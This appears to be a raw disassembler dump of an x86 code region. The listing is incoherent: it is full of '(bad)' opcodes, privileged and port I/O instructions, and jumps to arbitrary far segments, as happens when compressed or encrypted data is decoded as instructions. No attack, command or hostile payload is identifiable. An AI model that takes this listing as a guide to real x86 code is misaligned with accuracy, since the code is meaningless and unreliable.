  402f93:	lods   eax,DWORD PTR ds:[esi]
  402f94:	or     al,0x99
  402f96:	mov    edx,0x81d27029
  402f9b:	sbb    al,BYTE PTR [ebp-0x1d0ace45]
  402fa1:	cmp    al,0xdf
  402fa3:	sub    eax,0xa21c720d
  402fa8:	scas   al,BYTE PTR es:[edi]
  402fa9:	and    ebx,edx
  402fab:	sub    DWORD PTR [edi-0x5e],esp
  402fae:	hlt    
  402faf:	sub    ebx,DWORD PTR [edi-0x5999072a]
  402fb5:	out    dx,eax
  402fb6:	pushf  
  402fb7:	not    al
  402fb9:	loope  0x403002
  402fbb:	mov    gs,ecx
  402fbd:	aaa    
  402fbe:	push   ecx
  402fbf:	loope  0x402f4a
  402fc1:	scas   al,BYTE PTR es:[edi]
  402fc2:	test   BYTE PTR [edx-0x66],bl
  402fc5:	inc    esi
  402fc6:	jnp    0x402ff1
  402fc8:	push   esp
  402fc9:	fadd   QWORD PTR [edi+0x1e]
  402fcc:	mov    edi,0x5bdc6081
  402fd1:	mov    bh,0x24
  402fd3:	sti    
  402fd4:	or     al,0xb0
  402fd6:	loope  0x402fe6
  402fd8:	cmp    eax,0x55a13d29
  402fdd:	loop   0x403051
  402fdf:	pushf  
  402fe0:	test   al,0x1d
  402fe2:	pushf  
  402fe3:	cmp    eax,0xa94feba4
  402fe8:	adc    ch,dl
  402fea:	adc    esp,esi
  402fec:	xchg   edi,eax
  402fed:	mov    eax,0x7d6aca5f
  402ff2:	inc    edi
  402ff3:	(bad)  
  402ff4:	out    dx,eax
  402ff5:	add    al,0x31
  402ff7:	fsubr  st(4),st
  402ff9:	xor    al,0xa6
  402ffb:	push   ebp
  402ffc:	xor    eax,0x5abb143e
  403001:	add    DWORD PTR [eax],0xe86943ae
  403007:	jmp    0x4e0d2a41
  40300c:	push   esi
  40300d:	add    eax,0x4285a64
  403012:	mov    cl,0xed
  403014:	inc    esi
  403015:	popf   
  403016:	dec    ecx
  403017:	cmp    DWORD PTR [eax-0x44],esp
  40301a:	mov    gs,WORD PTR [edx+0x29]
  40301d:	shl    DWORD PTR [ebx+eiz*4-0x29346a55],cl
  403024:	cli    
  403025:	pop    ecx
  403026:	sub    ebx,DWORD PTR [eax]
  403028:	xchg   esi,eax
  403029:	popa   
  40302a:	jb     0x403045
  40302c:	lods   eax,DWORD PTR ds:[esi]
  40302d:	(bad)  
  40302f:	mov    ebx,0x1d951482
  403034:	repnz xor al,BYTE PTR [ecx]
  403037:	imul   eax,esi,0x22ebac97
  40303d:	dec    ebp
  40303e:	out    0xc3,al
  403040:	push   edx
  403041:	sbb    al,0x97
  403043:	xor    BYTE PTR [edx],bl
  403045:	lods   eax,DWORD PTR ds:[esi]
  403046:	jae    0x403081
  403048:	aam    0x1f
  40304a:	push   cs
  40304b:	xchg   ebp,eax
  40304c:	fs inc edi
  40304e:	retf   
  40304f:	xor    bh,0xfd
  403052:	push   ebx
  403053:	sbb    esp,ecx
  403055:	inc    esp
  403056:	pop    ebp
  403057:	stos   BYTE PTR es:[edi],al
  403058:	jno    0x403095
  40305a:	mov    DWORD PTR [edx-0x36],esi
  40305d:	ffreep st(6)
  40305f:	mov    esi,0xd6a76f5
  403064:	or     edx,DWORD PTR ds:0xe7103ebb
  40306a:	sbb    BYTE PTR [ebp+0x628df4b3],dl
  403070:	jg     0x4030e5
  403072:	jl     0x4030c3
  403074:	sub    ebx,0xb0bdea63
  40307a:	rcr    DWORD PTR [eax+0x63b35264],cl
  403080:	or     eax,0xd821e4c7
  403085:	add    eax,0x61067aac
  40308a:	mov    ebx,0xf90fae92
  40308f:	neg    BYTE PTR [eax+ebp*1-0x5c]
  403093:	stos   BYTE PTR es:[edi],al
  403094:	ret    0x905d
  403097:	(bad)  
  403098:	mov    BYTE PTR [ebx+0xf],al
  40309b:	hlt    
  40309c:	cld    
  40309d:	mov    ebp,0x2e2621eb
  4030a2:	or     edi,edi
  4030a4:	sahf   
  4030a5:	push   cs
  4030a6:	xor    ebp,ecx
  4030a8:	mov    esi,0x937238bf
  4030ad:	mov    BYTE PTR [eax],dh
  4030af:	sbb    eax,0xdfdf974f
  4030b4:	aaa    
  4030b5:	jae    0x403089
  4030b7:	mov    esp,0xce90929d
  4030bc:	sbb    al,bh
  4030be:	sahf   
  4030bf:	in     al,0x59
  4030c1:	jmp    0x1c00:0xf3f5f96d
  4030c8:	pop    es
  4030c9:	aam    0xd0
  4030cb:	loop   0x4030b2
  4030cd:	pop    eax
  4030ce:	fild   QWORD PTR [ebx]
  4030d0:	js     0x403142
  4030d2:	sub    ebx,DWORD PTR [edx+0x4]
  4030d5:	sub    BYTE PTR [esi],0xe5
  4030d8:	xchg   esp,eax
  4030d9:	mov    ebx,0x8c2510c2
  4030de:	sbb    BYTE PTR [ebp+0xb6b1da6],bh
  4030e4:	and    edi,DWORD PTR [ecx]
  4030e6:	icebp  
  4030e7:	pop    edi
  4030e8:	ret    0x1880
  4030eb:	cmp    DWORD PTR [ebx],0xaf625ac9
  4030f1:	and    esp,DWORD PTR [esi+0x1e]
  4030f4:	xor    DWORD PTR ds:[ecx+0x58],esi
  4030f8:	mov    ch,0xc3
  4030fa:	push   ebx
  4030fb:	loope  0x40315b
  4030fd:	jl     0x4030b0
  4030ff:	stc    
  403100:	dec    ebp
  403101:	int    0x9a
  403103:	mov    ds:0xc7944d66,al
  403108:	adc    eax,DWORD PTR [ecx-0x49ff75db]
  40310e:	xor    ebx,DWORD PTR [ebp-0x37]
  403111:	inc    ecx
  403112:	adc    al,0xd
  403114:	push   eax
  403115:	jbe    0x4030e1
  403117:	ret    
  403118:	call   0xb48be2ac
  40311d:	repz xor ecx,esi
  403120:	mov    esp,0xe8b76f22
  403125:	pop    DWORD PTR [edi-0x487106b5]
  40312b:	popa   
  40312c:	ja     0x4030b7
  40312e:	xchg   edi,eax
  40312f:	call   0xad9f:0x25828d10
  403136:	xchg   esi,eax
  403137:	dec    edi
  403138:	push   ebp
  403139:	int    0x47
  40313b:	sbb    cl,BYTE PTR [eax+eiz*1-0x341fca5c]
  403142:	jle    0x403144
  403144:	gs cmc 
  403146:	cmp    ebx,DWORD PTR [edx+0x5feba88d]
  40314c:	xor    BYTE PTR [ebp+0x2c],dh
  40314f:	les    esi,FWORD PTR [esi+esi*2]
  403152:	or     BYTE PTR ds:0x5dfc132f,al
  403158:	inc    edx
  403159:	adc    eax,0x506cfa3e
  40315e:	ins    BYTE PTR es:[edi],dx
  40315f:	sbb    eax,0x339384f4
  403164:	call   0x1d97:0x613bc08d
  40316b:	or     eax,edx
  40316d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40316e:	ror    BYTE PTR [ecx-0x36],1
  403171:	repnz pop esi
  403173:	scas   eax,DWORD PTR es:[di]
  403175:	pop    ds
  403176:	repnz cmp eax,0x2f5cde48
  40317c:	lds    eax,FWORD PTR [esi]
  40317e:	nop
  40317f:	cmp    DWORD PTR ds:0x313b093b,0x4d97fef3
  403189:	pop    esp
  40318a:	sub    dh,BYTE PTR [edi-0xe778ee4]
  403190:	ds mov eax,0xa8f3e608
  403196:	mov    eax,ds:0x41ad84df
  40319b:	mov    eax,ds:0x597a1cce
  4031a0:	or     al,0xc4
  4031a2:	pushf  
  4031a3:	sbb    ebx,DWORD PTR [ebx]
  4031a5:	inc    edx
  4031a6:	cwde   
  4031a7:	jne    0x403227
  4031a9:	shl    BYTE PTR [ecx+0x31],cl
  4031ac:	mov    bh,0x8c
  4031ae:	dec    esp
  4031af:	xor    BYTE PTR [eax-0x1a],bh
  4031b2:	in     al,0x28
  4031b4:	in     al,0xeb
  4031b6:	in     eax,dx
  4031b7:	push   esi
  4031b8:	add    BYTE PTR [eax+0x68217d0a],cl
  4031be:	mov    edx,0x3e93a812
  4031c3:	xchg   DWORD PTR [edi-0x7b],edx
  4031c6:	and    eax,0x8e5d665b
  4031cb:	pop    ds
  4031cc:	cmp    al,0xe4
  4031ce:	xor    eax,0x35215267
  4031d3:	push   eax
  4031d4:	mov    eax,0x1543e6e7
  4031d9:	fwait
  4031da:	xchg   ecx,eax
  4031db:	rol    DWORD PTR [ebp+0x22],cl
  4031de:	mov    esi,0x13c7847a
  4031e3:	push   ds
  4031e4:	jnp    0x4031ac
  4031e6:	jmp    0x7fa8:0x405ce092
  4031ed:	fld    QWORD PTR [ecx+ebp*4+0xd]
  4031f1:	(bad)  
  4031f2:	push   ds
  4031f3:	sub    esi,DWORD PTR [edi+edx*1]
  4031f6:	popf   
  4031f7:	mov    ecx,DWORD PTR [eax+0x37]
  4031fa:	jbe    0x403182
  4031fc:	push   ebp
  4031fd:	dec    esi
  4031fe:	pop    ecx
  4031ff:	arpl   WORD PTR [edi],ax
  403201:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403202:	rol    al,0x72
  403205:	(bad)  
  403206:	xor    ch,BYTE PTR [edi+0x1e]
  403209:	call   FWORD PTR [eax-0x418b67d7]
  40320f:	mov    edx,0xc20dbbf4
  403214:	(bad)  
  403215:	lds    eax,FWORD PTR [edi+edi*4-0x1a69338]
  40321c:	and    al,0xd9
  40321e:	call   0x8739:0xa4f1c5e4
  403225:	pop    ss
  403226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403227:	lods   al,BYTE PTR ds:[esi]
  403228:	xor    ebx,ebx
  40322a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40322b:	or     bh,BYTE PTR [edi-0x3a]
  40322e:	or     edx,edx
  403230:	sbb    dh,BYTE PTR [edi]
  403232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403233:	mov    eax,ds:0xf33189fc
  403238:	hlt    
  403239:	cmp    al,0x14
  40323b:	stc    
  40323c:	cld    
  40323d:	jb     0x40323f
  40323f:	jecxz  0x4031d1
  403241:	rcl    BYTE PTR [eax-0x17fc3164],cl
  403247:	jecxz  0x403275
  403249:	dec    ebx
  40324a:	push   ss
  40324b:	test   edi,esp
  40324d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40324e:	xor    dh,ch
  403250:	pop    ebx
  403251:	inc    ebx
  403252:	lahf   
  403253:	pop    edi
  403254:	xor    ecx,DWORD PTR [ebp-0x6ccb6003]
  40325a:	leave  
  40325b:	sbb    DWORD PTR fs:[ebx],0xbd18f79a
  403262:	dec    ebp
  403263:	in     eax,0x5c
  403265:	(bad)  
  403267:	or     al,0x77
  403269:	mov    dh,0x45
  40326b:	lds    eax,FWORD PTR [ebx+0x3e804567]
  403271:	nop
  403272:	or     eax,0xd93290f2
  403277:	ret    
  403278:	mov    al,ds:0xd807f18b
  40327d:	mov    bl,0x19
  40327f:	mov    edi,0x3ebc0354
  403284:	pop    esp
  403285:	ins    WORD PTR es:[edi],dx
  403287:	mov    ds:0x807351b5,eax
  40328c:	aam    0xf2
  40328e:	jmp    0xaeac:0xff44101a
  403295:	das    
  403296:	(bad)  
  403298:	outs   dx,BYTE PTR ds:[esi]
  403299:	(bad)  
  40329b:	jae    0x4032d6
  40329d:	jge    0x4032fc
  40329f:	sub    ebp,0x2090aca6
  4032a5:	add    ebx,DWORD PTR ds:0x8205e062
  4032ab:	jmp    0x6c73:0x9fd9e214
  4032b2:	push   ebx
  4032b3:	iret   
  4032b4:	xchg   ecx,eax
  4032b5:	pushf  
  4032b6:	cmp    eax,0x51c1c43f
  4032bb:	or     DWORD PTR [ebp-0x6083ba0b],ebp
  4032c1:	(bad)  
  4032c2:	out    0x71,eax
  4032c4:	inc    esp
  4032c5:	cmp    esi,ecx
  4032c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032c8:	mov    cx,0xcd7b
  4032cc:	(bad)  
  4032cd:	in     al,0x8f
  4032cf:	rcr    DWORD PTR [edi-0x6940be1d],0x74
  4032d6:	fistp  DWORD PTR [edx-0xe]
  4032d9:	cmp    eax,0x43b4da69
  4032de:	sub    al,BYTE PTR [ebx-0x5044017e]
  4032e4:	fcomp  QWORD PTR [edx]
  4032e6:	cmc    
  4032e7:	inc    esp
  4032e8:	lds    ebx,FWORD PTR [edx-0x40057709]
  4032ee:	mov    ds:0xd85359c5,al
  4032f3:	iret   
  4032f4:	jmp    0x3a5c4c3
  4032f9:	jb     0x4032e0
  4032fb:	cmp    al,0x84
  4032fd:	mov    eax,ds:0xd86b8e56
  403302:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403303:	inc    ebp
  403304:	ficomp DWORD PTR [esi+edi*2-0x154efa52]
  40330b:	mov    cl,BYTE PTR [ebp+0x6d]
  40330e:	add    bh,al
  403310:	fnstsw WORD PTR [edx+0x6]
  403313:	xor    DWORD PTR [edi],eax
  403315:	mov    esp,ebx
  403317:	cmp    eax,0x803ba58b
  40331c:	ins    BYTE PTR es:[edi],dx
  40331d:	mul    BYTE PTR cs:[ebp-0x3c]
  403321:	(bad)  
  403323:	inc    eax
  403324:	mov    eax,ds:0x4f91f2f9
  403329:	les    eax,FWORD PTR [esi-0x19aebaee]
  40332f:	popf   
  403330:	jecxz  0x4032bb
  403332:	test   al,0xc9
  403334:	sbb    ch,BYTE PTR [edx]
  403336:	dec    esi
  403337:	mov    bl,0x40
  403339:	outs   dx,DWORD PTR ds:[esi]
  40333a:	mov    dl,0x63
  40333c:	aam    0xf7
  40333e:	aaa    
  40333f:	mov    BYTE PTR [edi+0x7420dac2],dh
  403345:	mov    ds:0xd1052a68,al
  40334a:	xchg   esp,eax
  40334b:	adc    edi,DWORD PTR [eax-0x72]
  40334e:	xchg   BYTE PTR [eax+eax*2-0x7774cd42],dl
  403355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403356:	push   ebx
  403357:	mov    ebp,0x3ce8e014
  40335c:	das    
  40335d:	dec    esp
  40335e:	sbb    edi,DWORD PTR [ebx*4-0x1d55a8c1]
  403365:	cmp    esi,DWORD PTR [ebx-0x6e]
  403368:	sbb    ebp,DWORD PTR [esp+eiz*2]
  40336b:	push   eax
  40336c:	loop   0x4033c7
  40336e:	mov    esp,gs
  403370:	sub    DWORD PTR [ecx-0x4e289458],edi
  403376:	shl    BYTE PTR [edx],cl
  403378:	sub    eax,0x684cbf80
  40337d:	pop    ebp
  40337e:	jno    0x40330c
  403380:	loop   0x403358
  403382:	shl    BYTE PTR ds:0xc007c743,0x3e
  403389:	dec    eax
  40338a:	push   ds
  40338b:	ja     0x40339c
  40338d:	push   esp
  40338e:	lods   al,BYTE PTR ds:[esi]
  40338f:	pop    edx
  403390:	and    al,0x98
  403392:	in     al,dx
  403393:	fld    DWORD PTR [edi]
  403395:	mov    eax,0x38c341f9
  40339a:	push   ds
  40339b:	dec    eax
  40339c:	pop    ecx
  40339d:	jg     0x4033a8
  40339f:	sub    bh,BYTE PTR [esi-0x7e]
  4033a2:	mov    esp,0x6a83b4cb
  4033a7:	es xor eax,0x38ebe486
  4033ad:	lahf   
  4033ae:	mov    eax,ds:0x442ba962
  4033b3:	sbb    eax,0xf1b87855
  4033b8:	js     0x403365
  4033ba:	scas   eax,DWORD PTR es:[edi]
  4033bb:	ffree  st(4)
  4033bd:	sbb    al,0xfb
  4033bf:	pop    ebx
  4033c0:	xor    ebx,DWORD PTR [ecx*4+0x1a9c6b89]
  4033c7:	ldmxcsr DWORD PTR [ecx]
  4033ca:	push   ecx
  4033cb:	in     eax,0x74
  4033cd:	xor    bh,BYTE PTR [esi]
  4033cf:	mov    BYTE PTR [ecx-0x72],0x43
  4033d3:	es enter 0x737c,0x74
  4033d8:	and    al,0xc2
  4033da:	pop    esi
  4033db:	mov    gs,esi
  4033dd:	mov    cl,0x99
  4033df:	leave  
  4033e0:	inc    ebx
  4033e1:	mov    ah,0x78
  4033e3:	test   eax,0x9b00798b
  4033e8:	inc    eax
  4033e9:	ss mov ecx,0xef02e34d
  4033ef:	not    edx
  4033f1:	jae    0x40345f
  4033f3:	mov    bl,0xd3
  4033f5:	push   cs
  4033f6:	cld    
  4033f7:	pop    esi
  4033f8:	cdq    
  4033f9:	sbb    al,BYTE PTR [ebx+0x3f]
  4033fc:	cmp    dl,ch
  4033fe:	inc    esp
  4033ff:	pop    esi
  403400:	scas   eax,DWORD PTR es:[edi]
  403401:	pop    esi
  403402:	jge    0x40343c
  403404:	pop    ds
  403405:	bnd fs jne 0x40340d
  403409:	sub    ch,BYTE PTR [edi]
  40340b:	(bad)  
  40340e:	fwait
  40340f:	xchg   edx,eax
  403410:	pop    ds
  403411:	mov    ss,WORD PTR [esp+ebx*1-0x6a]
  403415:	aas    
  403416:	inc    ecx
  403417:	mov    ecx,0x7683270f
  40341c:	mov    cl,0x4
  40341e:	popf   
  40341f:	fs retf 
  403421:	int    0x0
  403423:	cmp    al,0xdc
  403425:	sub    DWORD PTR [ebp+edi*4+0x2f25dfa1],ebp
  40342c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40342d:	pop    edx
  40342e:	out    0xd1,eax
  403430:	fsubr  DWORD PTR [edx]
  403432:	or     al,0x78
  403434:	ja     0x4034ac
  403436:	retf   
  403437:	pop    esi
  403438:	lods   eax,DWORD PTR ds:[esi]
  403439:	call   0xb788602c
  40343e:	fwait
  40343f:	jbe    0x403455
  403441:	in     eax,dx
  403442:	addr16 ret 
  403444:	xor    BYTE PTR [edi],cl
  403446:	clc    
  403447:	jo     0x40348b
  403449:	add    eax,0x451cf261
  40344e:	push   esi
  40344f:	dec    edi
  403450:	mov    edx,0x3bed0c77
  403455:	dec    edi
  403456:	pop    edi
  403457:	adc    al,BYTE PTR [edi+0x2f]
  40345a:	ja     0x403460
  40345c:	jmp    DWORD PTR [edx]
  40345e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40345f:	shr    eax,0x97
  403462:	lock add ch,BYTE PTR [ecx]
  403465:	(bad)  
  403466:	into   
  403467:	scas   al,BYTE PTR es:[edi]
  403468:	xchg   esp,eax
  403469:	fs test eax,0x9ea2cc6f
  40346f:	xchg   esi,eax
  403470:	pop    esp
  403471:	mov    BYTE PTR [esi+0x31],0xc3
  403475:	call   0x63045aef
  40347a:	ret    
  40347b:	cmp    al,0x88
  40347d:	xchg   BYTE PTR [edi+0x68],al
  403480:	sbb    ecx,DWORD PTR [ebx+0x7b19ae0a]
  403486:	pusha  
  403487:	cmp    BYTE PTR [edx-0x75cbabd6],ch
  40348d:	bound  ebp,QWORD PTR [ebp+0x5b362c8e]
  403493:	mov    eax,0xed3c0ae6
  403498:	js     0x40348f
  40349a:	sub    eax,0x953b981b
  40349f:	arpl   WORD PTR [edx],bx
  4034a1:	sahf   
  4034a2:	sub    al,0x32
  4034a4:	push   ebx
  4034a5:	ds (bad) 
  4034a8:	lods   eax,DWORD PTR ds:[esi]
  4034a9:	popa   
  4034aa:	inc    edi
  4034ab:	adc    DWORD PTR [ebp+0x27],eax
  4034ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034af:	cmp    eax,0xcd5797e2
  4034b4:	cmp    ch,ch
  4034b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034b7:	xchg   BYTE PTR [edx],bh
  4034b9:	xchg   esp,eax
  4034ba:	pop    esi
  4034bb:	mov    edi,0xe0cae4dc
  4034c0:	mov    esi,0xf86e7f8f
  4034c5:	or     eax,0x4ce073e6
  4034ca:	mov    al,0xa9
  4034cc:	adc    DWORD PTR [ecx-0x47],esp
  4034cf:	imul   ebp,DWORD PTR [edi+0xb286d24],0x9ac1869a
  4034d9:	dec    edi
  4034da:	fld    DWORD PTR [eax]
  4034dc:	push   es
  4034dd:	dec    eax
  4034de:	inc    ebx
  4034df:	pop    edi
  4034e0:	xchg   esp,eax
  4034e1:	lock clc 
  4034e3:	mov    WORD PTR [ebx-0x6950f4ea],es
  4034e9:	into   
  4034ea:	cmp    eax,esp
  4034ec:	js     0x403485
  4034ee:	popf   
  4034ef:	xchg   esi,eax
  4034f0:	cwde   
  4034f1:	jbe    0x40353a
  4034f3:	mov    dl,0x7e
  4034f5:	fwait
  4034f6:	xchg   ecx,eax
  4034f7:	cmp    DWORD PTR [eax],esp
  4034f9:	mov    bl,0xfd
  4034fb:	fist   WORD PTR [ebx-0x33f77a9e]
  403501:	data16 ja 0x403577
  403504:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403505:	xor    BYTE PTR [ebx+eiz*2],bh
  403508:	xor    ah,BYTE PTR ds:0x1b4d114b
  40350e:	out    dx,al
  40350f:	push   0xc4bf4c83
  403514:	sub    ecx,edi
  403516:	neg    DWORD PTR [edx-0x3e7e83ac]
  40351c:	xchg   edi,eax
  40351d:	cmp    dl,cl
  40351f:	push   ebx
  403520:	mov    ecx,0xbe8d6a4b
  403525:	js     0x403560
  403527:	xchg   esi,eax
  403528:	ror    edi,0x29
  40352b:	out    dx,al
  40352c:	stos   BYTE PTR es:[edi],al
  40352d:	sub    dh,0xce
  403530:	pop    es
  403531:	sbb    al,0x14
  403533:	pop    edi
  403534:	sbb    al,0xe4
  403536:	dec    edi
  403537:	fisubr DWORD PTR [eax+0x442ab215]
  40353d:	mov    bh,0x6d
  40353f:	loop   0x403518
  403541:	iret   
  403542:	push   edx
  403543:	mov    ch,BYTE PTR [ebx]
  403545:	(bad)  
  403546:	xchg   edx,eax
  403547:	ret    0x1916
  40354a:	sbb    edi,DWORD PTR [ebx+ebp*2]
  40354d:	sub    bl,dh
  40354f:	add    DWORD PTR [ebx],0x54
  403552:	rcr    edi,0xdf
  403555:	jb     0x403577
  403557:	data16 jno 0x4035b3
  40355a:	out    0x13,eax
  40355c:	pop    es
  40355d:	or     edi,DWORD PTR [edi+0x5f]
  403560:	inc    eax
  403561:	xor    DWORD PTR [esi+0x13239d77],eax
  403567:	jb     0x403523
  403569:	dec    ebx
  40356a:	call   0x42f2:0xe4f74940
  403571:	xor    bl,cl
  403573:	sub    al,0xf1
  403575:	lds    esi,FWORD PTR [esi-0x54]
  403578:	and    edx,DWORD PTR [edi+ebx*1-0xf557825]
  40357f:	(bad)  
  403580:	pop    ds
  403581:	test   al,0xa3
  403583:	or     esp,DWORD PTR ds:0xb7b3bb12
  403589:	ret    0x9d12
  40358c:	out    0x9d,al
  40358e:	jo     0x403574
  403590:	xor    BYTE PTR [esp+edx*2+0x37684727],cl
  403597:	ss imul ecx,eax,0xffffffaa
  40359b:	pop    ds
  40359c:	mov    edi,0x75e5b1a3
  4035a1:	imul   ecx,DWORD PTR [ecx+0x7b],0xffffffef
  4035a5:	mov    ds:0x89c23a48,eax
  4035aa:	jle    0x403618
  4035ac:	pushf  
  4035ad:	addr16 lahf 
  4035af:	cmp    al,0x22
  4035b1:	sbb    dh,dl
  4035b3:	and    ecx,DWORD PTR [ecx+0x794a2432]
  4035b9:	pop    ebp
  4035ba:	xor    DWORD PTR [esi+0x8],eax
  4035bd:	pop    ds
  4035be:	clc    
  4035bf:	sbb    DWORD PTR [esi],edi
  4035c1:	or     ah,BYTE PTR [edx]
  4035c3:	retf   0xba20
  4035c6:	int    0x96
  4035c8:	jmp    0x97d75f28
  4035cd:	push   ebp
  4035ce:	push   0xffffffd2
  4035d0:	cld    
  4035d1:	sub    eax,DWORD PTR [ebx+0x5a]
  4035d4:	adc    DWORD PTR [ecx+0x6b75b3a4],esi
  4035da:	mov    al,0x9
  4035dc:	or     eax,0xdedf0420
  4035e1:	mov    esi,0x10c97183
  4035e6:	or     DWORD PTR [ecx+0x6c2c8153],esp
  4035ec:	int3   
  4035ed:	imul   esp,DWORD PTR [ecx-0x21c6802b],0x7
  4035f4:	call   FWORD PTR [ebx]
  4035f6:	mov    edx,0x96680915
  4035fb:	sbb    BYTE PTR [edi],0x3e
  4035fe:	xor    al,0x6a
  403600:	in     al,dx
  403601:	push   ecx
  403602:	xor    ebp,DWORD PTR [esi+0x21]
  403605:	aas    
  403606:	cli    
  403607:	adc    DWORD PTR [eax+0x78],ebp
  40360a:	adc    dh,BYTE PTR [esi-0x5ea16db4]
  403610:	into   
  403611:	sub    al,0xc2
  403613:	and    eax,0x72a4acb1
  403618:	xchg   edi,eax
  403619:	and    eax,0x74df53e1
  40361e:	add    DWORD PTR ss:[ecx-0x5efc5740],eax
  403625:	pop    edi
  403626:	add    al,bh
  403628:	add    al,0xe1
  40362a:	lods   eax,DWORD PTR ds:[esi]
  40362b:	dec    edi
  40362c:	add    ah,BYTE PTR [ebx]
  40362e:	or     ebp,DWORD PTR [edx+0x5b25c6df]
  403634:	jge    0x403625
  403636:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403637:	mov    bl,0xc2
  403639:	and    BYTE PTR [esi+eiz*2+0x70],ah
  40363d:	sbb    ebp,ebx
  40363f:	sub    ah,BYTE PTR [edi+edi*4+0x34]
  403643:	or     DWORD PTR [edx+0x45b71e1f],ecx
  403649:	fdiv   st(3),st
  40364b:	imul   ecx,DWORD PTR [edx-0x6342626c],0xffffff96
  403652:	jb     0x403699
  403654:	lahf   
  403655:	fst    QWORD PTR [ebp+0x25949415]
  40365b:	imul   edi,eax,0x13166b0f
  403661:	mov    ds:0x66ca7dda,al
  403666:	repz lds edi,FWORD PTR [esi+0x17171fda]
  40366d:	add    DWORD PTR [ebx-0x66],edx
  403670:	fidiv  DWORD PTR [eax*1-0x1369d15a]
  403677:	retf   0x9923
  40367a:	scas   eax,DWORD PTR es:[edi]
  40367b:	mov    edx,0x59075eef
  403680:	mov    edx,0xd0c09a4a
  403685:	int3   
  403686:	inc    edi
  403687:	xor    eax,0xab0a7d15
  40368c:	loopne 0x403665
  40368e:	std    
  40368f:	lods   al,BYTE PTR ds:[esi]
  403690:	cmp    dl,bh
  403692:	push   ds
  403693:	jae    0x4036b7
  403695:	sub    DWORD PTR [edi+0x22],esp
  403698:	and    eax,DWORD PTR [esp+eax*4]
  40369b:	cmc    
  40369c:	adc    eax,esi
  40369e:	dec    ebp
  40369f:	jmp    0xc928fbdb
  4036a4:	add    eax,0x3a8938a7
  4036a9:	test   edi,esp
  4036ab:	dec    ebp
  4036ac:	pop    edx
  4036ad:	and    BYTE PTR [edi],dl
  4036af:	jae    0x4036cc
  4036b1:	sub    al,0xbd
  4036b3:	dec    edx
  4036b4:	push   ecx
  4036b5:	ds and al,0xae
  4036b8:	into   
  4036b9:	mov    esi,0xa5cd8682
  4036be:	jge    0x403720
  4036c0:	inc    esp
  4036c1:	push   ecx
  4036c2:	das    
  4036c3:	jb     0x4036dc
  4036c5:	add    al,0x90
  4036c7:	(bad)  
  4036c8:	cmp    BYTE PTR [ebx+0x10],0x37
  4036cc:	xchg   esp,eax
  4036cd:	psubw  mm3,mm1
  4036d0:	adc    ch,BYTE PTR [edi]
  4036d2:	add    BYTE PTR [eax],ah
  4036d4:	push   esi
  4036d5:	ja     0x403735
  4036d7:	les    esp,FWORD PTR ds:0x772c9234
  4036dd:	idiv   DWORD PTR [edi+0x0]
  4036e0:	(bad)  
  4036e1:	bound  ebx,QWORD PTR [edi+0x7697783a]
  4036e7:	push   0xffffffc4
  4036e9:	pop    ds
  4036ea:	loop   0x403700
  4036ec:	loopne 0x4036f7
  4036ee:	mov    ds:0x9ce5a261,al
  4036f3:	jne    0x4036c3
  4036f5:	add    esp,DWORD PTR [edx]
  4036f7:	jb     0x40375a
  4036f9:	pusha  
  4036fa:	rcl    DWORD PTR [edx],cl
  4036fc:	out    dx,al
  4036fd:	or     BYTE PTR [esi-0x3a24431e],dl
  403703:	(bad)
  403706:	add    eax,0x27905125
  40370b:	xor    eax,0x2d12c1c4
  403710:	push   ds
  403711:	bound  esp,QWORD PTR es:[edx]
  403714:	mov    cl,0xaa
  403716:	ss xor eax,0x4aca5edd
  40371c:	jle    0x403766
  40371e:	cmp    ebx,DWORD PTR [edx-0x710871e1]
  403724:	aas    
  403725:	xor    bh,ah
  403727:	mov    BYTE PTR [ecx-0xf],bh
  40372a:	inc    eax
  40372b:	or     BYTE PTR [eax],bh
  40372d:	xchg   ebp,eax
  40372e:	push   ss
  40372f:	pop    es
  403730:	pop    ebx
  403731:	imul   eax,DWORD PTR [ebx-0x43],0x47ce3c25
  403738:	dec    edx
  403739:	and    BYTE PTR [ecx+0x42],0x29
  40373d:	or     al,0xd7
  40373f:	lock or BYTE PTR [ebx+0x67],bl
  403743:	push   edi
  403744:	or     eax,0x6c961dc3
  403749:	cmp    ebp,0x46f7e9f2
  40374f:	push   ecx
  403750:	in     al,dx
  403751:	and    BYTE PTR [esi+0x55],0x1f
  403755:	and    dl,BYTE PTR [edi]
  403757:	aad    0x82
  403759:	pop    ebp
  40375a:	xchg   esi,eax
  40375b:	pop    ebx
  40375c:	or     BYTE PTR [eax],bl
  40375e:	or     al,0x68
  403760:	mov    dl,cl
  403762:	and    ecx,esi
  403764:	stos   BYTE PTR es:[edi],al
  403765:	fwait
  403766:	jmp    0x21fc:0x36064b42
  40376d:	mov    dl,BYTE PTR [edx]
  40376f:	iret   
  403770:	inc    esp
  403771:	lods   eax,DWORD PTR ds:[esi]
  403772:	adc    al,0x59
  403774:	jge    0x40373d
  403776:	xor    al,0xc9
  403778:	iret   
  403779:	mov    esi,0x952d3241
  40377e:	not    BYTE PTR [esi-0x7eedb76a]
  403784:	fsub   QWORD PTR [edx-0x1ca55006]
  40378a:	(bad)  
  40378b:	cmp    eax,0x5d2cce12
  403790:	push   0xa95d1964
  403795:	push   eax
  403796:	(bad)  
  403797:	aas    
  403798:	sub    eax,0x52005c59
  40379d:	xor    DWORD PTR [edi],esi
  40379f:	jnp    0x4037bc
  4037a1:	(bad)  
  4037a2:	stc    
  4037a3:	sar    BYTE PTR [esi+0x52],1
  4037a6:	or     esp,ecx
  4037a8:	lock cmp BYTE PTR [edi+0x4c6d1e6a],dh
  4037af:	or     DWORD PTR [ebp+0x49fda045],esi
  4037b5:	pop    ss
